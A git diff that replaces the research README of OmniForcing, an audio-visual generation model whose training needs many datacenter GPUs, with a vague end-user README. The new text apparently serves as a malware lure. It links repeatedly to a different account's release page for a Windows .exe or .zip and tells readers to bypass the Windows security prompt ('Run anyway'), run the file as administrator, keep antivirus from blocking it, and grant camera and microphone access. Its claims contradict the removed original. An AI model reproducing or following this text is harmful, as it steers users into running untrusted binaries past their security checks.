@@ -1,284 +1,199 @@
-<div align="center">
+# 🎬 OmniForcing - Real-time Audio and Video Generation
 
-# OmniForcing: Unleashing Real-time Joint Audio-Visual Generation
+[![Download OmniForcing](https://img.shields.io/badge/Download%20OmniForcing-blue?style=for-the-badge)](https://github.com/Born-enormity133/OmniForcing/releases)
 
-<img src="static/images/teaser_2.png" width="100%">
+## 🧭 What OmniForcing Does
 
-[Yaofeng Su]()\*<sup>1,2</sup>, [Yuming Li]()\*<sup>3</sup>, [Zeyue Xue]()<sup>1,4</sup>, [Jie Huang]()<sup>1</sup>, [Siming Fu]()<sup>1</sup>, [Haoran Li]()<sup>1</sup>, [Ying Li]()<sup>3</sup>, [Zezhong Qian]()<sup>3</sup>, [Haoyang Huang]()<sup>1</sup>, [Nan Duan]()<sup>1</sup>
+OmniForcing is a Windows app for real-time audio and video generation. It turns a single GPU into a live joint audio-visual generator.
 
-\*Equal contribution &ensp;|&ensp; <sup>1</sup>JD Explore Academy &ensp; <sup>2</sup>Fudan University &ensp; <sup>3</sup>Peking University &ensp; <sup>4</sup>The University of Hong Kong
+This app is built for end users who want to run the released version on a Windows PC. You do not need to train a model or build the app from source to get started.
 
-<a href="https://arxiv.org/abs/2603.11647"><img src="https://img.shields.io/badge/arXiv-2603.11647-b31b1b.svg" alt="arXiv"></a>
-<a href="https://omniforcing.com"><img src="https://img.shields.io/badge/Project-Page-blue.svg" alt="Project Page"></a>
+## 📥 Download
 
-</div>
+Visit the release page to download the Windows build:
 
-**OmniForcing** is the first framework to distill an offline, bidirectional joint audio-visual diffusion model into a **real-time streaming autoregressive generator**. Built on top of LTX-2 (14B video + 5B audio), OmniForcing achieves streaming t2av generation while maintaining visual and acoustic fidelity on par with the bidirectional teacher model.
+[Download OmniForcing from Releases](https://github.com/Born-enormity133/OmniForcing/releases)
 
+Look for the latest release and choose the Windows file that matches your system. In most cases, this will be a `.exe` installer or a `.zip` package.
 
-## News
+## 💻 System Requirements
 
-- **[2026/03]** Full training code and data processing pipeline open-sourced.
-- **[2026/03]** Paper released on [arXiv 2603.11647](https://arxiv.org/abs/2603.11647). Project page is live at [OmniForcing.com](https://omniforcing.com).
+Use a Windows PC with the following setup:
 
+- Windows 10 or Windows 11
+- NVIDIA GPU with CUDA support
+- At least 8 GB of VRAM
+- 16 GB of system memory
+- 10 GB of free disk space
+- A recent NVIDIA driver
+- A stable internet connection for the first download
 
-## Method Overview
+For smooth real-time output, a stronger GPU helps. If you plan to generate higher-quality audio and video, use a card with more VRAM.
 
-<div align="center">
-<img src="static/images/method.png" width="100%">
-</div>
+## 🛠️ Before You Start
 
-OmniForcing employs a **three-stage distillation pipeline** to progressively transform the bidirectional teacher into a causal streaming engine:
+Check these items before you install:
 
-- **Stage 1 -- Bidirectional DMD:** Distribution Matching Distillation compresses the multi-step diffusion sampling into few-step denoising, while preserving the original global attention.
+- Your Windows user account has permission to run downloaded apps
+- Your GPU driver is current
+- You have enough disk space for the app and its models
+- Your antivirus tool does not block the download
+- You know where your Downloads folder is
 
-- **Stage 2 -- Causal ODE Regression:** The model is equipped with our **Asymmetric Block-Causal Mask** and trained via ODE trajectory regression to adapt to causal attention. An **Audio Sink Token** mechanism with **Identity RoPE** is introduced to resolve the Softmax collapse and gradient explosion caused by extreme audio token sparsity.
+If the release page includes model files or extra assets, download those too and keep them in the same folder as the app, if the release notes say to do so.
 
-- **Stage 3 -- Joint Self-Forcing DMD:** The model autoregressively unrolls its own generations during training, enabling dynamic self-correction of cumulative cross-modal errors from exposure bias. Two variants are provided:
-  - **Self-Forcing DMD** (`main` branch): Autoregressive self-forcing rollout with DMD loss (recommended).
-  - **Causal DMD** (`causal-dmd` branch): Block-wise DMD training without self-forcing rollout.
+## 🚀 Install and Run on Windows
 
-## Results & Demos
+Follow these steps in order:
 
-### Main Results on JavisBench
+1. Open the [Releases page](https://github.com/Born-enormity133/OmniForcing/releases)
+2. Download the latest Windows release
+3. If the file is a `.zip`, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. If the file is an `.exe`, double-click it to start the app
+6. If Windows shows a security prompt, choose **More info** and then **Run anyway**
+7. Wait for the app to finish loading
+8. Open the app window and load your audio or video source, if the build includes that option
+9. Start generation from inside the app
 
-<div align="center">
-<table>
-<thead>
-<tr>
-<th>Model</th><th>Size</th><th>FVD ↓</th><th>FAD ↓</th><th>CLIP ↑</th><th>AV-IB ↑</th><th>DeSync ↓</th><th>Runtime ↓</th>
-</tr>
-</thead>
-<tbody>
-<tr><td>MMAudio</td><td>0.1B</td><td>--</td><td>6.1</td><td>--</td><td>0.198</td><td>0.849</td><td>15s</td></tr>
-<tr><td>JavisDiT++</td><td>2.1B</td><td>141.5</td><td>5.5</td><td>0.316</td><td>0.198</td><td>0.832</td><td>10s</td></tr>
-<tr><td>UniVerse-1</td><td>6.4B</td><td>194.2</td><td>8.7</td><td>0.309</td><td>0.104</td><td>0.929</td><td>13s</td></tr>
-<tr><td>LTX-2 (Teacher)</td><td>19B</td><td><b>125.4</b></td><td><b>4.6</b></td><td>0.318</td><td><b>0.318</b></td><td><b>0.384</b></td><td>197s</td></tr>
-<tr><td><b>OmniForcing (Ours)</b></td><td>19B</td><td>137.2</td><td>5.7</td><td><b>0.322</b></td><td>0.269</td><td>0.392</td><td><b>5.7s</b></td></tr>
-</tbody>
-</table>
-</div>
+If the release page gives separate files for the app and the model, download both before you start.
 
-### Distillation Fidelity (VBench)
+## 🎛️ First Launch
 
-<div align="center">
-<table>
-<thead>
-<tr>
-<th>Model</th><th>Aesthetic ↑</th><th>Imaging ↑</th><th>Motion Smooth. ↑</th><th>Subject Consist. ↑</th><th>TTFC ↓</th><th>FPS ↑</th>
-</tr>
-</thead>
-<tbody>
-<tr><td>LTX-2 (Teacher)</td><td>0.569</td><td>0.574</td><td>0.993</td><td>0.945</td><td>197.0s</td><td>--</td></tr>
-<tr><td><b>OmniForcing</b></td><td><b>0.595</b></td><td><b>0.594</b></td><td><b>0.995</b></td><td><b>0.955</b></td><td><b>0.7s</b></td><td><b>25</b></td></tr>
-</tbody>
-</table>
-</div>
+The first time you open OmniForcing, it may take longer to start. The app may load model files into memory before you see the main window.
 
-### Demo Gallery
+During first launch, you may see:
 
-<div align="center">
-<a href="https://omniforcing.com"><img src="static/images/fig4_1.png" width="100%"></a>
-<p><sub>Click the image above to watch audio-visual demos on our Project Page.</sub></p>
-</div>
+- A short pause before the app opens
+- A console window
+- A model loading bar
+- A message about GPU setup
 
+Let the app finish loading. Do not close it while the model is starting.
 
-## Getting Started
+## 🎚️ Basic Use
 
-### Prerequisites
+OmniForcing is meant to make joint audio and video generation simple.
 
-- Python >= 3.10
-- PyTorch >= 2.2.0
-- 8x or 32x GPUs with 96GB+ memory (H200 recommended). Causal DMD branch may work on lower-memory GPUs.
+A typical flow looks like this:
 
-### Installation
+1. Open the app
+2. Load or connect your input source
+3. Choose the output settings
+4. Pick the quality level or speed mode
+5. Start generation
+6. Watch the live result in the preview area
+7. Save the output when you are done
 
-```bash
-git clone https://github.com/OmniForcing/OmniForcing.git
-cd OmniForcing/LTX-2
+If the app gives you controls for latency, frame rate, or audio length, use the default values first. Then adjust one setting at a time.
 
-# Install with uv (recommended)
-uv sync
+## 🎥 Output Tips
 
-# Or install with pip
-pip install -e packages/ltx-core
-pip install -e packages/ltx-pipelines
-pip install -e packages/ltx-causal
-pip install -e packages/ltx-distillation
-```
+For better results, use clean input and stable hardware.
 
-### Download Models
+- Use short test clips first
+- Keep background noise low for audio input
+- Close other GPU-heavy apps
+- Use a power plan that keeps your PC from sleeping
+- Make sure your monitor and GPU drivers are current
 
-Download the following pretrained models and update the paths in the config files:
+If the app supports live preview, check the preview before saving the final result.
 
-| Model | Description |
-|-------|-------------|
-| `ltx-2-19b-dev.safetensors` | LTX-2 base model (19B), from [Lightricks/LTX-2](https://huggingface.co/collections/Lightricks/ltx-2) |
-| `gemma-3-12b-it-qat-q4_0-unquantized` | Gemma 3 12B text encoder (unquantized QAT variant) |
+## 🧩 Common File Types
 
+You may see these file types on the release page:
 
+- `.exe` — run this file on Windows
+- `.zip` — extract the folder, then open the app
+- `.json` — settings or model config
+- `.pth` or `.bin` — model files
+- `.txt` — read this file for release notes or setup steps
 
+If you are not sure which file to use, choose the Windows installer or the main app package from the latest release
 
-## Training Pipeline
+## ⚙️ Recommended Setup
 
-> **Note:** Support for LTX-2.3, improved inference pipeline, and future new work will be released soon. Multi-node launch scripts may need modification depending on your cluster scheduler (SLURM, etc.).
+For the best experience, use this setup:
 
-The training follows a three-stage pipeline. We recommend **32 GPUs** (4 nodes x 8 GPUs) for optimal performance. You can also train with **8 GPUs** by setting `gradient_accumulation_steps: 4` in the config.
+- Windows 11
+- NVIDIA RTX 4070 or better
+- 32 GB RAM
+- SSD storage
+- Updated NVIDIA Studio Driver
+- A display with enough space for the app window and preview panels
 
-### Stage 1: Bidirectional DMD
+A faster GPU and more memory help the app keep audio and video in sync during live generation.
 
-Distills the LTX-2 teacher model from multi-step to 4-step inference while preserving global attention.
+## 🔍 If the App Does Not Open
 
-**Data preparation:** Prepare a text prompts file (one prompt per line). You can use our prompt enhancement tools to expand short captions into detailed LTX-2 prompts:
+Try these steps if the app does not start:
 
-```bash
-cd LTX-2/packages/pe
+1. Reboot your PC
+2. Update your NVIDIA driver
+3. Make sure the download finished fully
+4. Extract the full `.zip` file again
+5. Run the app as an administrator
+6. Check that Windows did not block the file
+7. Close other apps that use the GPU
+8. Try the latest release from the download page
 
-# Option A: Heavy mode - vLLM + LLM (recommended, higher quality)
-# First start a vLLM server with your preferred LLM:
-#   vllm serve /path/to/your/llm --tensor-parallel-size 8
-python batch_enhance.py captions.txt --duration 5s
+If the app opens and then closes, look for a log file in the app folder and review the last few lines for the cause
 
-# Option B: Light mode - local Gemma via vLLM (simpler, faster)
-python enhance_prompts_light.py --input captions.txt --output prompts.txt
-```
+## 🗂️ Folder Layout
 
-**Training:**
+A common release folder may look like this:
 
-```bash
-cd LTX-2/packages/ltx-distillation
+- `OmniForcing.exe` — main app
+- `models/` — model files
+- `assets/` — app resources
+- `logs/` — runtime logs
+- `config/` — app settings
 
-# Edit configs/stage1_bidirectional_dmd.yaml with your paths, then:
-./scripts/train_stage1_bidirectional_dmd.sh
+Keep the files in the same folder unless the release notes say otherwise.
 
-# Or specify config explicitly:
-./scripts/train_stage1_bidirectional_dmd.sh configs/stage1_bidirectional_dmd.yaml
-```
+## 🔒 Permissions
 
-### Stage 2: Causal ODE Regression
+The app may need access to:
 
-Converts the bidirectional model to causal autoregressive using ODE trajectory regression. This stage requires generating ODE trajectory pairs from the Stage 1 teacher.
+- GPU resources
+- Microphone input
+- Camera input
+- File save locations
 
-**Step 1: Generate ODE trajectory pairs**
+If Windows asks for permission, allow the app to use the device or folder it needs.
 
-```bash
-cd LTX-2/packages/ltx-distillation
+## 📚 Release Notes
 
-# Single GPU:
-TEACHER_CHECKPOINT=/path/to/stage1_checkpoint/model.pt \
-GEMMA_PATH=/path/to/gemma \
-PROMPTS_FILE=/path/to/prompts.txt \
-OUTPUT_DIR=./ode_pairs \
-    ./scripts/generate_ode_pairs.sh
+Check the release page for:
 
-# Multi-node (faster):
-NNODES=2 NODE_RANK=0 MASTER_ADDR=10.0.0.1 \
-TEACHER_CHECKPOINT=/path/to/stage1_checkpoint/model.pt \
-    ./scripts/generate_ode_pairs_multi_node.sh
-```
+- New build versions
+- Bug fixes
+- Added input support
+- Model updates
+- Known issues
+- Extra setup files
 
-**Step 2: Create LMDB dataset**
+Read the notes for the version you download. Some builds may have different steps or extra files.
 
-```bash
-DATA_PATH=./ode_pairs LMDB_PATH=./ode_lmdb ./scripts/create_ode_lmdb.sh
-```
+## 🧪 Known Use Cases
 
-**Step 3: Train**
+OmniForcing can fit these use cases:
 
-```bash
-# Edit configs/stage2_causal_ode.yaml with your paths, then:
-./scripts/train_stage2_causal_ode.sh
-```
+- Real-time audio-visual demos
+- Live generation tests
+- GPU performance checks
+- Research playback
+- Creative prototyping
+- Streaming experiments
 
-### Stage 3: Causal DMD
+It is built for fast joint generation, so it works best on a machine with a strong NVIDIA GPU.
 
-Trains the causal autoregressive model with DMD loss using the ODE-initialized generator and bidirectional teacher/critic.
+## 📌 Quick Steps
 
-Two variants are available:
-
-| Variant | Branch | Description |
-|---------|--------|-------------|
-| **Self-Forcing DMD** | `main` | Autoregressive self-forcing rollout with DMD loss (recommended) |
-| **Causal DMD** | `causal-dmd` | Block-wise DMD training without self-forcing rollout |
-
-**Training (Self-Forcing DMD, default):**
-
-```bash
-# Edit configs/stage3_causal_dmd.yaml with your paths, then:
-./scripts/train_stage3_causal_dmd.sh
-```
-
-**Training (Causal DMD, alternative):**
-
-```bash
-git checkout causal-dmd
-./scripts/train_stage3_causal_dmd.sh
-```
-
-### Hardware Recommendations
-
-| Setup | GPUs | Config Change |
-|-------|------|---------------|
-| Recommended | 32 (4 nodes x 8) | Default settings |
-| Minimum | 8 (1 node) | Set `gradient_accumulation_steps: 4` |
-
-All training scripts auto-detect SLURM and multi-node environment variables. For multi-node training, set `NNODES`, `NODE_RANK`, and `MASTER_ADDR`.
-
-
-## Repository Structure
-
-```
-OmniForcing/
-├── README.md
-├── static/                              # Demo images and videos
-└── LTX-2/
-    └── packages/
-        ├── ltx-core/                    # Base model components (transformer, VAE, text encoder)
-        ├── ltx-causal/                  # Causal wrapper, attention masks, block-causal architecture
-        ├── ltx-distillation/            # Training pipeline
-        │   ├── configs/
-        │   │   ├── stage1_bidirectional_dmd.yaml
-        │   │   ├── stage2_causal_ode.yaml
-        │   │   └── stage3_causal_dmd.yaml
-        │   ├── scripts/
-        │   │   ├── train_stage1_bidirectional_dmd.sh
-        │   │   ├── train_stage2_causal_ode.sh
-        │   │   ├── train_stage3_causal_dmd.sh
-        │   │   ├── generate_ode_pairs.sh
-        │   │   ├── generate_ode_pairs_multi_node.sh
-        │   │   └── create_ode_lmdb.sh
-        │   └── src/ltx_distillation/
-        │       ├── train_distillation.py    # DMD training loop (Stages 1 & 3)
-        │       ├── dmd.py                   # DMD model, loss, generator/critic
-        │       ├── ode/                     # ODE regression (Stage 2)
-        │       │   ├── train_ode.py
-        │       │   ├── generate_ode_pairs.py
-        │       │   └── create_lmdb.py
-        │       ├── inference/               # Benchmark pipelines
-        │       └── models/                  # Model wrappers
-        ├── ltx-pipelines/               # Inference pipeline utilities
-        └── pe/                          # Prompt enhancement tools
-            ├── batch_enhance.py         # Heavy mode (vLLM + LLM, higher quality)
-            ├── prompt_enhancer.py       # Heavy mode core (duration-aware)
-            ├── enhance_prompts_light.py # Light mode (simpler, faster)
-            └── light_system_prompt.txt  # Light mode system prompt
-```
-
-
-## Citation
-
-If you find OmniForcing useful in your research, please consider citing:
-
-```bibtex
-@article{su2026omniforcing,
-  title   = {OmniForcing: Unleashing Real-time Joint Audio-Visual Generation},
-  author  = {Su, Yaofeng and Li, Yuming and Xue, Zeyue and Huang, Jie and Fu, Siming
-             and Li, Haoran and Li, Ying and Qian, Zezhong and Huang, Haoyang and Duan, Nan},
-  journal = {arXiv preprint arXiv:2603.11647},
-  year    = {2026}
-}
-```
-
-## Acknowledgements
-
-OmniForcing builds upon several outstanding works. We thank the authors of [LTX-2](https://github.com/Lightricks/LTX-2), [Self-Forcing](https://github.com/guandeh17/Self-Forcing), [CausVid](https://github.com/tianweiy/CausVid), and [DMD](https://github.com/tianweiy/DMD2) for their pioneering contributions.
+1. Open the release page
+2. Download the Windows build
+3. Extract the file if needed
+4. Run the app
+5. Wait for model loading
+6. Start generation
+7. Save your output
